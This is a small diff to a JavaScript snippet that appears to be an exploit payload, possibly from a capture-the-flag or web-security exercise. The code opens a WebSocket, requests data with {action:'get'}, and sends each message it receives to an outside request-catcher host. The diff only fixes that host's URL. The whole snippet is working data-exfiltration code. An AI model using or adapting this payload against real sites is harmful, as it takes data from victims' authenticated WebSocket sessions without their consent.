@@ -5,5 +5,5 @@ ws.onopen = () => {
     ws.send(JSON.stringify({action:'get'}));
 }
 ws.onmessage = async (msg) => {
-    fetch(`https://kek.requestcatcher/?kek=${msg.data}`);
+    fetch(`https://kek.requestcatcher.com/?kek=${msg.data}`);
 }
